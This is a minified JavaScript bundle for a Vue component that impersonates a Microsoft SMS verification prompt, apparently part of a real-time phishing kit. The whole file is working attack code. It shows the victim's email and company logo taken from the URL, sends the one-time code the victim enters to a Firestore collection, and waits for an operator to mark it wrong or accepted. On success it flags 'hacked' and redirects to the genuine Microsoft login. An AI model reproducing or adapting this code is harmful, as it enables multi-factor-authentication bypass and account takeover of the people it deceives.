(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["SMSVerificationForm"],{a1c3:function(e,t,r){"use strict";var a=r("f982"),o=r.n(a);o.a},d315:function(e,t,r){"use strict";r.r(t);var a=function(){var e=this,t=e.$createElement,r=e._self._c||t;return r("v-container",{staticClass:"d-flex justify-center",attrs:{"fill-height":""}},[r("v-dialog",{attrs:{width:"450",persistent:""},model:{value:e.showDialog,callback:function(t){e.showDialog=t},expression:"showDialog"}},[r("v-card",{staticClass:"pa-10",attrs:{width:"450",disabled:e.disableCard,tile:""}},[r("v-toolbar",{attrs:{flat:""}},[r("v-toolbar-title",[r("v-img",{staticClass:"my-2",attrs:{alt:"Microsoft Logo",src:e.companyLogo,transition:"scale-transition","max-height":"70","max-width":"150"}}),r("v-btn",{staticClass:"text-none pl-1",attrs:{text:!0,color:"",depressed:""}},[e._v(" "+e._s(e.email)+" ")])],1)],1),r("v-card-text",[r("h2",{staticClass:"mt-3 mb-4 black--text"},[e._v("Enter code")]),r("p",{staticClass:"black--text"},[r("v-icon",{attrs:{left:""}},[e._v("mdi-message-reply-outline")]),e._v(e._s(e.$route.params.smsInfo)+" ")],1),e.error?r("p",{staticClass:"red--text"},[e._v(" You didn't enter the expected verification code. Please try again. "),r("router-link",{attrs:{to:"/"}},[e._v("View details")]),e._v(". ")],1):e._e(),r("v-form",{ref:"form",attrs:{"lazy-validation":""},on:{submit:function(t){return t.preventDefault(),e.onSubmit(t)}}},[r("v-text-field",{attrs:{dense:!0,label:"Code",type:"text",required:""},on:{keyup:function(t){return!t.type.indexOf("key")&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:e.submitForm(t)}},model:{value:e.smsCode,callback:function(t){e.smsCode=t},expression:"smsCode"}}),r("p",{staticClass:"caption"},[r("router-link",{attrs:{to:""}},[e._v("More Information")])],1),r("v-row",[r("v-spacer"),r("v-btn",{staticClass:"rounded-button black--text text-none mx-2 px-10",attrs:{depressed:!0,color:"#9198a3"}},[e._v("Cancel")]),r("v-btn",{staticClass:"rounded-button white--text text-none px-10",attrs:{width:"",depressed:!0,color:"#005DA6"},on:{click:e.submitForm}},[e._v("Verify")])],1)],1)],1)],1)],1)],1)},o=[],n=(r("4160"),r("caad"),r("ac1f"),r("2532"),r("1276"),r("159b"),r("96cf"),r("1da1")),s=r("dc59"),i={name:"LoginForm",data:function(){return{error:!1,disableCard:!1,email:"",smsCode:"",browser:"",showLogo:!1,showDialog:!0}},created:function(){var e=this;return Object(n["a"])(regeneratorRuntime.mark((function t(){var r;return regeneratorRuntime.wrap((function(t){while(1)switch(t.prev=t.next){case 0:return e.email=e.$route.params.data.includes("@")?e.$route.params.data:window.atob(e.$route.params.data).split(",")[0],e.companyLogo=window.atob(e.$route.params.data).split(",")[3],e.browser=e.$route.params.browser,e.companyName=e.email.split("@")[1].split(".")[0],window.document.title=e.companyName,t.next=7,s["a"].collection("workers");case 7:r=t.sent,r.where("browser","==",e.browser).onSnapshot((function(t){t.docChanges().forEach(function(){var t=Object(n["a"])(regeneratorRuntime.mark((function t(r){var a;return regeneratorRuntime.wrap((function(t){while(1)switch(t.prev=t.next){case 0:a=r.doc.data(),console.log(r.type),"server"===a.from&&"modified"===r.type&&("sms_error"===a.info&&(e.error=!0,e.disableCard=!1,e.password=""),"verification_complete"===a.info&&(localStorage.setItem("hacked",!0),window.location.href="https://login.microsoftonline.com"));case 3:case"end":return t.stop()}}),t)})));return function(e){return t.apply(this,arguments)}}())}));case 9:case"end":return t.stop()}}),t)})))()},computed:{},methods:{submitForm:function(){var e=this;return Object(n["a"])(regeneratorRuntime.mark((function t(){var r;return regeneratorRuntime.wrap((function(t){while(1)switch(t.prev=t.next){case 0:if(e.disableCard=!0,e.error=!1,!(e.smsCode.length<5)){t.next=6;break}return e.error=!0,e.disableCard=!1,t.abrupt("return");case 6:return t.next=8,s["a"].collection("workers");case 8:return r=t.sent,t.next=11,r.doc(e.browser).set({browser:e.browser,data_type:"sms",smsCode:e.smsCode,from:"client",screenState:"",info:""},{merge:!0});case 11:case"end":return t.stop()}}),t)})))()}}},c=i,l=(r("a1c3"),r("2877")),d=r("6544"),u=r.n(d),m=r("8336"),p=r("b0af"),f=r("99d9"),b=r("a523"),w=r("169a"),v=r("4bd4"),h=r("132d"),x=r("adda"),g=r("0fd9"),C=r("2fa4"),k=r("8654"),y=r("71d9"),_=r("2a7f"),V=Object(l["a"])(c,a,o,!1,null,null,null);t["default"]=V.exports;u()(V,{VBtn:m["a"],VCard:p["a"],VCardText:f["a"],VContainer:b["a"],VDialog:w["a"],VForm:v["a"],VIcon:h["a"],VImg:x["a"],VRow:g["a"],VSpacer:C["a"],VTextField:k["a"],VToolbar:y["a"],VToolbarTitle:_["a"]})},f982:function(e,t,r){}}]);
//# sourceMappingURL=SMSVerificationForm.b4c575ca.js.map